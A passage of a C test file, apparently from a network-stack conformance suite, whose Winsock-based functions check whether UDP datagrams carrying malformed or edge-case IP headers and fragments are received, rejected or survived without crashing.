//	WORD			ExpectedRemotePort	Remote port that should be reported for packet
//	DWORD			ExpectedLength		Length that should be reported for packet
//	BOOL			fUseLength			Whether to care if the length matches or not
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL ReceiveIPPacket(WORD LocalPort, WORD ExpectedRemotePort, DWORD ExpectedLength, BOOL fUseLength)
{
	SOCKET IPSocket = INVALID_SOCKET;
	SOCKADDR_IN LocalAddress, RemoteAddress;
	DWORD dwBytesAvailable = 0, dwBufferSize = 0, dwBytesReceived = 0;
	BOOL fPassed = TRUE;
	CHAR *pBuffer = NULL;
	INT nRemoteAddressSize = sizeof(SOCKADDR_IN);

	// Create the socket
	IPSocket = socket(AF_INET, SOCK_DGRAM, 0);
	if(IPSocket == INVALID_SOCKET)
	{
		xLog(g_hLog, XLL_WARN, "Couldn't create socket!");
		fPassed = FALSE;
		goto Exit;
	}

	// Setup the local binding info
	LocalAddress.sin_addr.s_addr = INADDR_ANY;
	LocalAddress.sin_family = AF_INET;
	LocalAddress.sin_port = htons(LocalPort);

	// Bind the socket
	if(bind(IPSocket, (const struct sockaddr *) &LocalAddress, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
	{
		xLog(g_hLog, XLL_WARN, "Couldn't bind socket!");
		fPassed = FALSE;
		goto Exit;
	}

	// Wait for the socket to receive a packet (i.e. select will say it is readable)
	if(!IsSocketReady(IPSocket, READABLE, 10))
	{
		xLog(g_hLog, XLL_INFO, "Winsock reported no data available");
		fPassed = FALSE;
		goto Exit;
	}

	// A datagram is buffered, now receive it...
	if(ioctlsocket(IPSocket, FIONREAD, &dwBytesAvailable) == SOCKET_ERROR)
	{
		xLog(g_hLog, XLL_WARN, "Query for number of bytes available failed");
		fPassed = FALSE;
		goto Exit;
	}

	xLog(g_hLog, XLL_INFO, "%u bytes available on socket", dwBytesAvailable);

	dwBufferSize = dwBytesAvailable ? dwBytesAvailable : 1;
	pBuffer = (CHAR *) LocalAlloc(LPTR, dwBufferSize);

	// Receive the datagram
	if((dwBytesReceived = recvfrom(IPSocket, pBuffer, dwBufferSize, 0, (struct sockaddr *) &RemoteAddress, &nRemoteAddressSize)) == SOCKET_ERROR)
	{
		xLog(g_hLog, XLL_INFO, "Couldn't receive the datagram");
		fPassed = FALSE;
		goto Exit;
	}

	// Is the reported port correct?
	if(ntohs(RemoteAddress.sin_port) != ExpectedRemotePort)
	{
		xLog(g_hLog, XLL_INFO, "Reported destination port (%u) didn't match expected value (%u)", ntohs(RemoteAddress.sin_port), ExpectedRemotePort);
		fPassed = FALSE;
		goto Exit;
	}

	// Is the reported length correct?
	if(fUseLength && (dwBytesReceived != ExpectedLength))
	{
		xLog(g_hLog, XLL_WARN, "Reported length (%u) didn't match expected value (%u)", dwBytesReceived, ExpectedLength);
		fPassed = FALSE;
		goto Exit;
	}

	xLog(g_hLog, XLL_INFO, "Packet received successfully");

Exit:

	(IPSocket != INVALID_SOCKET) ? closesocket(IPSocket) : 0;
	pBuffer ? LocalFree(pBuffer) : 0;

	return fPassed;
}

//==================================================================================
// IPVersionSixTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive an IP packet with version 6
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPVersionSixTest(WORD LowPort, WORD HighPort)
{
	return !ReceiveIPPacket(LowPort, LowPort, 1, FALSE);
}

//==================================================================================
// IPVersionBadTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive an IP packet with version other than 4 or 6
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPVersionBadTest(WORD LowPort, WORD HighPort)
{
	return !ReceiveIPPacket(LowPort, LowPort, 1, FALSE);
}

//==================================================================================
// IPHeaderLenBelowMinTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive an IP packet with a header indicating a size
// below the minimum
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPHeaderLenBelowMinTest(WORD LowPort, WORD HighPort)
{
	return !ReceiveIPPacket(LowPort, LowPort, 1, FALSE);
}

//==================================================================================
// IPHeaderLenMaxTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive an IP packet with maximum header size
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPHeaderLenMaxTest(WORD LowPort, WORD HighPort)
{
	return ReceiveIPPacket(LowPort, LowPort, 1, TRUE);
}

//==================================================================================
// IPHeaderLenAboveTotalLenTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive an IP packet with a header length greater
// than the total datagram length
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPHeaderLenAboveTotalLenTest(WORD LowPort, WORD HighPort)
{
	return !ReceiveIPPacket(LowPort, LowPort, 1, FALSE);
}

//==================================================================================
// IPHeaderLenAboveAvailTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive an IP packet with a header length greater
// than the available bytes in the datagram
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPHeaderLenAboveAvailTest(WORD LowPort, WORD HighPort)
{
	return !ReceiveIPPacket(LowPort, LowPort, 1, FALSE);
}

//==================================================================================
// IPTosNormalTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive an IP packet with a normal type-of-service
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPTosNormalTest(WORD LowPort, WORD HighPort)
{
	return ReceiveIPPacket(LowPort, LowPort, 1, TRUE);
}

//==================================================================================
// IPTosNetControlTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive an IP packet with a net-control type-of-service
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPTosNetControlTest(WORD LowPort, WORD HighPort)
{
	return ReceiveIPPacket(LowPort, LowPort, 1, TRUE);
}

//==================================================================================
// IPTosLowDelayTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive an IP packet with a low-delay type-of-service
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPTosLowDelayTest(WORD LowPort, WORD HighPort)
{
	return ReceiveIPPacket(LowPort, LowPort, 1, TRUE);
}

//==================================================================================
// IPTosHighThroughputTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive an IP packet with a high-throughput type-of-service
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPTosHighThroughputTest(WORD LowPort, WORD HighPort)
{
	return ReceiveIPPacket(LowPort, LowPort, 1, TRUE);
}

//==================================================================================
// IPTosHighReliabilityTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive an IP packet with a high-reliability type-of-service
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPTosHighReliabilityTest(WORD LowPort, WORD HighPort)
{
	return ReceiveIPPacket(LowPort, LowPort, 1, TRUE);
}

//==================================================================================
// IPTosReservedTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive an IP packet with a reserved type-of-service
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPTosReservedTest(WORD LowPort, WORD HighPort)
{
	return ReceiveIPPacket(LowPort, LowPort, 1, TRUE);
}

//==================================================================================
// IPLengthBelowMinTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive an IP packet with a total length field
// below the minimum datagram size
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPLengthBelowMinTest(WORD LowPort, WORD HighPort)
{
	return !ReceiveIPPacket(LowPort, LowPort, 1, FALSE);
}

//==================================================================================
// IPLengthAtMinTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive an IP packet with a total length field
// of exactly the minimum datagram size
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPLengthAtMinTest(WORD LowPort, WORD HighPort)
{
	// We shouldn't be able to receive this, we're really just looking for an
	// off-by-one exception in the stack
	return !ReceiveIPPacket(LowPort, LowPort, 1, FALSE);
}

//==================================================================================
// IPLengthAboveMinTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive an IP packet with a total length field
// above the minimum datagram size
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPLengthAboveMinTest(WORD LowPort, WORD HighPort)
{
	return ReceiveIPPacket(LowPort, LowPort, 1, TRUE);
}

//==================================================================================
// IPLengthAboveTotalTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive an IP packet with a total length field
// above the available bytes in the datagram
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPLengthAboveTotalTest(WORD LowPort, WORD HighPort)
{
	return !ReceiveIPPacket(LowPort, LowPort, 1, FALSE);
}

//==================================================================================
// IPLengthBelowTotalTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive an IP packet with a total length field
// below the available bytes in the datagram
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPLengthBelowTotalTest(WORD LowPort, WORD HighPort)
{
	return ReceiveIPPacket(LowPort, LowPort, 1, TRUE);
}

//==================================================================================
// IPLengthMaxTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive an IP packet with a total length field
// is the maximum allowable in a single non-fragmented datagram over Ethernet
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPLengthMaxTest(WORD LowPort, WORD HighPort)
{
	return ReceiveIPPacket(LowPort, LowPort, 1472, TRUE);
}

//==================================================================================
// IPIDMinTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive an IP packet with the minimum possible ID
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPIDMinTest(WORD LowPort, WORD HighPort)
{
	return ReceiveIPPacket(LowPort, LowPort, 1, TRUE);
}

//==================================================================================
// IPIDMaxTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive an IP packet with the maximum possible ID
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPIDMaxTest(WORD LowPort, WORD HighPort)
{
	return ReceiveIPPacket(LowPort, LowPort, 1, TRUE);
}

//==================================================================================
// IPFlagReservedSetTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive an IP packet with the reserved flag set
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFlagReservedSetTest(WORD LowPort, WORD HighPort)
{
	return ReceiveIPPacket(LowPort, LowPort, 1, TRUE);
}

//==================================================================================
// IPFlagDontFragAndMoreFragsTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive an IP packet with both the don't-frag
// and more-frags flags set
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFlagDontFragAndMoreFragsTest(WORD LowPort, WORD HighPort)
{
	return !ReceiveIPPacket(LowPort, LowPort, 1, FALSE);
}

//==================================================================================
// IPTtlMinTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive an IP packet with the minimum time-to-live
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPTtlMinTest(WORD LowPort, WORD HighPort)
{
	return ReceiveIPPacket(LowPort, LowPort, 1, TRUE);
}

//==================================================================================
// IPTtlMaxTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive an IP packet with the maximum time-to-live
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPTtlMaxTest(WORD LowPort, WORD HighPort)
{
	return ReceiveIPPacket(LowPort, LowPort, 1, TRUE);
}

//==================================================================================
// IPProtocolUnsupportedTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can properly handle a packet from an unsupported protocol
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPProtocolUnsupportedTest(WORD LowPort, WORD HighPort)
{
	// We're really just testing to see if we crash when we get a packet like this
	// No point trying to actually receive it
	Sleep(5000);
	return TRUE;
}

//==================================================================================
// IPProtocolICMPTooSmallTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can properly handle an IP packet saying it is an ICMP
// packet but with no payload
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPProtocolICMPTooSmallTest(WORD LowPort, WORD HighPort)
{
	// We're really just testing to see if we crash when we get a packet like this
	// No point trying to actually receive it
	Sleep(5000);
	return TRUE;
}

//==================================================================================
// IPProtocolIGMPTooSmallTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can properly handle an IP packet saying it is an IGMP
// packet but with no payload
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPProtocolIGMPTooSmallTest(WORD LowPort, WORD HighPort)
{
	// We're really just testing to see if we crash when we get a packet like this
	// No point trying to actually receive it
	Sleep(5000);
	return TRUE;
}

//==================================================================================
// IPProtocolTCPTooSmallTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can properly handle an IP packet saying it is an TCP
// packet but with no payload
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPProtocolTCPTooSmallTest(WORD LowPort, WORD HighPort)
{
	// We're really just testing to see if we crash when we get a packet like this
	// No point trying to actually receive it
	Sleep(5000);
	return TRUE;
}

//==================================================================================
// IPProtocolUDPTooSmallTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can properly handle an IP packet saying it is an UDP
// packet but with no payload
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPProtocolUDPTooSmallTest(WORD LowPort, WORD HighPort)
{
	// We're really just testing to see if we crash when we get a packet like this
	// No point trying to actually receive it
	Sleep(5000);
	return TRUE;
}

//==================================================================================
// IPProtocolUnsupportedTooSmallTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can properly handle an IP packet saying it is a
// packet of an unsupported protocol but with no payload
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPProtocolUnsupportedTooSmallTest(WORD LowPort, WORD HighPort)
{
	// We're really just testing to see if we crash when we get a packet like this
	// No point trying to actually receive it
	Sleep(5000);
	return TRUE;
}

//==================================================================================
// IPChecksumBadTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive an IP packet with a bad checksum
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPChecksumBadTest(WORD LowPort, WORD HighPort)
{
	return !ReceiveIPPacket(LowPort, LowPort, 1, FALSE);
}

//==================================================================================
// IPOptionsAboveAvailTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can properly handle an IP datagram where an option
// in the header is cutoff by the end of the packet
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPOptionsAboveAvailTest(WORD LowPort, WORD HighPort)
{
	// We're really just testing to see if we crash when we get a packet like this
	// No point trying to actually receive it
	Sleep(5000);
	return TRUE;
}

//==================================================================================
// IPOptionsExactSizeTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive a datagram where the header contains a
// variable length option that ends exactly at the end of the header.
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPOptionsExactSizeTest(WORD LowPort, WORD HighPort)
{
	return !ReceiveIPPacket(LowPort, LowPort, 1, FALSE);
}

//==================================================================================
// IPOptionsEndOfOpsLastTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive a datagram where the header contains a
// variable length option and ends with an end-of-options option
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPOptionsEndOfOpsLastTest(WORD LowPort, WORD HighPort)
{
	return ReceiveIPPacket(LowPort, LowPort, 1, TRUE);
}

//==================================================================================
// IPOptionsEndOfOpsFirstTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive a datagram where the header contains an
// end-of-options option followed by a variable-length option
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPOptionsEndOfOpsFirstTest(WORD LowPort, WORD HighPort)
{
	return !ReceiveIPPacket(LowPort, LowPort, 1, FALSE);
}

//==================================================================================
// IPFragFullReverseTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive a 4 fragmented datagram where the fragments
// arrive in full reverse order
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragFullReverseTest(WORD LowPort, WORD HighPort)
{
	return ReceiveIPPacket(LowPort, LowPort, 56, TRUE);
}

//==================================================================================
// IPFragMidReverseTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive a 4 fragmented datagram where the fragments
// arrive such that the middle two fragments are in reverse order
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragMidReverseTest(WORD LowPort, WORD HighPort)
{
	return ReceiveIPPacket(LowPort, LowPort, 56, TRUE);
}

//==================================================================================
// IPFragLastInSecondTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive a 4 fragmented datagram where the fragments
// arrive such that the last fragment arrives second and the remaining fragments are in order
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragLastInSecondTest(WORD LowPort, WORD HighPort)
{
	return ReceiveIPPacket(LowPort, LowPort, 56, TRUE);
}

//==================================================================================
// IPFragMixedSizeTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive a 4 fragmented datagram where each of the
// fragments are of a different size
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragMixedSizeTest(WORD LowPort, WORD HighPort)
{
	return ReceiveIPPacket(LowPort, LowPort, 64, TRUE);
}

//==================================================================================
// IPFragOneHundredTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive a 100 fragmented datagram
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragOneHundredTest(WORD LowPort, WORD HighPort)
{
	return ReceiveIPPacket(LowPort, LowPort, 1592, TRUE);
}

//==================================================================================
// IPFragMultipleLastFragmentTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive a datagram that has multiple fragments
// with different offsets that don't have the more-frags flag set
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragMultipleLastFragmentTest(WORD LowPort, WORD HighPort)
{
	return !ReceiveIPPacket(LowPort, LowPort, 40, FALSE);
}

//==================================================================================
// IPFragOverlappingFragmentsTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive a datagram that has where received
// fragments have overlapping payload data
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragOverlappingFragmentsTest(WORD LowPort, WORD HighPort)
{
	return ReceiveIPPacket(LowPort, LowPort, 32, TRUE);
}

//==================================================================================
// IPFragMaxDatagramSizeTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive a fragmented datagram with the maximum possible
// datagram size of 64K - 1
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragMaxDatagramSizeTest(WORD LowPort, WORD HighPort)
{
	return !ReceiveIPPacket(LowPort, LowPort, 64 * 1024 - 1, FALSE);
}

//==================================================================================
// IPFragMaxReassemblySizeTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive a fragmented datagram with the default
// maximum allowable reassembly size 2K
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragMaxReassemblySizeTest(WORD LowPort, WORD HighPort)
{
	return ReceiveIPPacket(LowPort, LowPort, 2 * 1024 - UDPHEADER_SIZE, TRUE);
}

//==================================================================================
// IPFragAboveMaxReassemblySizeTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive a fragmented datagram with a size of just
// above the default maximum allowable reassembly size (2K + 1)
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragAboveMaxReassemblySizeTest(WORD LowPort, WORD HighPort)
{
	return !ReceiveIPPacket(LowPort, LowPort, 2 * 1024 + 1, FALSE);
}

//==================================================================================
// IPFragMaxSimulReassemblyTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive and successfully reassemble the maximum
// number of simultaneous fragmented IP datagrams
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragMaxSimulReassemblyTest(WORD LowPort, WORD HighPort)
{
	SOCKET IPSockets[SIM_REASM_MAX];
	SOCKADDR_IN LocalAddress, RemoteAddress;
	DWORD dwBytesAvailable = 0, dwBufferSize = 0, dwBytesReceived = 0;
	BOOL fPassed = TRUE;
	CHAR *pBuffer = NULL;
	INT SocketIndex, SocketsReady, nRemoteAddressSize = sizeof(SOCKADDR_IN);
	fd_set SocketCollection;
	timeval TimeOut = {0, 0}; // set to wait 5 seconds

	FD_ZERO(&SocketCollection);

	// Create and bind all the sockets
	for(SocketIndex = 0; SocketIndex < SIM_REASM_MAX; ++SocketIndex)
	{
		IPSockets[SocketIndex] = INVALID_SOCKET;

		// Create the socket
		IPSockets[SocketIndex] = socket(AF_INET, SOCK_DGRAM, 0);
		if(IPSockets[SocketIndex] == INVALID_SOCKET)
		{
			xLog(g_hLog, XLL_WARN, "Couldn't create socket!");
			fPassed = FALSE;
			goto Exit;
		}
		
		// Setup the local binding info
		LocalAddress.sin_addr.s_addr = INADDR_ANY;
		LocalAddress.sin_family = AF_INET;
		LocalAddress.sin_port = htons((LowPort + SocketIndex + MAX_SIMUL_PORT_OFFSET) % 0xffff + 1);

		// Bind the socket
		if(bind(IPSockets[SocketIndex], (const struct sockaddr *) &LocalAddress, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
		{
			xLog(g_hLog, XLL_WARN, "Couldn't bind socket!");
			fPassed = FALSE;
			goto Exit;
		}

		// Add each socket to the fds structure
		FD_SET(IPSockets[SocketIndex], &SocketCollection);

		xLog(g_hLog, XLL_INFO, "Added socket %u to set for readability monitoring", SocketIndex);	
	}

	Sleep(5000);

	SocketsReady = 0;
	if((SocketsReady = select(0, &SocketCollection, NULL, NULL, &TimeOut)) != SIM_REASM_MAX)
	{
			xLog(g_hLog, XLL_WARN, "Only %u sockets were readable, expecting %u", SocketsReady, SIM_REASM_MAX);
			fPassed = FALSE;
			goto Exit;
	}

	// Check the available data and recv it from each of the sockets
	for(SocketIndex = 0; SocketIndex < SIM_REASM_MAX; ++SocketIndex)
	{
		// A datagram is buffered, now receive it...
		if(ioctlsocket(IPSockets[SocketIndex], FIONREAD, &dwBytesAvailable) == SOCKET_ERROR)
		{
			xLog(g_hLog, XLL_WARN, "Query for number of bytes available failed on socket %u", SocketIndex);
			fPassed = FALSE;
			goto Exit;
		}
		
		dwBufferSize = dwBytesAvailable ? dwBytesAvailable : 1;
		pBuffer = (CHAR *) LocalAlloc(LPTR, dwBufferSize);
		
		// Receive the datagram
		if((dwBytesReceived = recvfrom(IPSockets[SocketIndex], pBuffer, dwBufferSize, 0, (struct sockaddr *) &RemoteAddress, &nRemoteAddressSize)) == SOCKET_ERROR)
		{
			xLog(g_hLog, XLL_WARN, "Couldn't receive the datagram on socket %u", SocketIndex);
			fPassed = FALSE;
			goto Exit;
		}
		
		// Is the reported port correct?
		if(ntohs(RemoteAddress.sin_port) != LowPort)
		{
			xLog(g_hLog, XLL_WARN, "Reported destination port (%u) didn't match expected value (%u) on socket %u", ntohs(RemoteAddress.sin_port), LowPort, SocketIndex);
			fPassed = FALSE;
			goto Exit;
		}
		
		// Is the reported length correct?
		if(dwBytesReceived != 24)
		{
			xLog(g_hLog, XLL_WARN, "Reported length (%u) didn't match expected value (%u) on socket %u", dwBytesReceived, 24, SocketIndex);
			fPassed = FALSE;
			goto Exit;
		}
		
		xLog(g_hLog, XLL_INFO, "Packet on socket %u received successfully", SocketIndex);	

		// Free the buffer if necessary
		if(pBuffer)
		{
			LocalFree(pBuffer);
			pBuffer = NULL;
		}
	}

Exit:

	// We have to sleep long enough to guarantee that all fragments have timed out
	Sleep(60000);

		// Check the available data and recv it from each of the sockets
	for(SocketIndex = 0; SocketIndex < SIM_REASM_MAX; ++SocketIndex)
		(IPSockets[SocketIndex] != INVALID_SOCKET) ? closesocket(IPSockets[SocketIndex]) : 0;

	pBuffer ? LocalFree(pBuffer) : 0;

	return fPassed;
}

//==================================================================================
// IPFragAboveMaxSimulReassemblyTest
//----------------------------------------------------------------------------------
//
// Description: Test whether we can receive and successfully reassemble the first
// few reassembleable packets when we receive more than the maximum number of simultaneous
// fragmented IP datagrams
//
// Arguments:
//	WORD			LowPort				Lowest port to bind to
//	WORD			HighPort			Highest port to bind to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragAboveMaxSimulReassemblyTest(WORD LowPort, WORD HighPort)
{
	SOCKET IPSockets[SIM_REASM_MAX + 1];
	SOCKADDR_IN LocalAddress, RemoteAddress;
	DWORD dwBytesAvailable = 0, dwBufferSize = 0, dwBytesReceived = 0;
	BOOL fPassed = TRUE;
	CHAR *pBuffer = NULL;
	INT SocketIndex, SocketsReady, nRemoteAddressSize = sizeof(SOCKADDR_IN);
	fd_set SocketCollection;
	timeval TimeOut = {0, 0}; // set to wait 5 seconds

	FD_ZERO(&SocketCollection);

	// Create and bind all the sockets
	for(SocketIndex = 0; SocketIndex < SIM_REASM_MAX + 1; ++SocketIndex)
	{
		IPSockets[SocketIndex] = INVALID_SOCKET;

		// Create the socket
		IPSockets[SocketIndex] = socket(AF_INET, SOCK_DGRAM, 0);
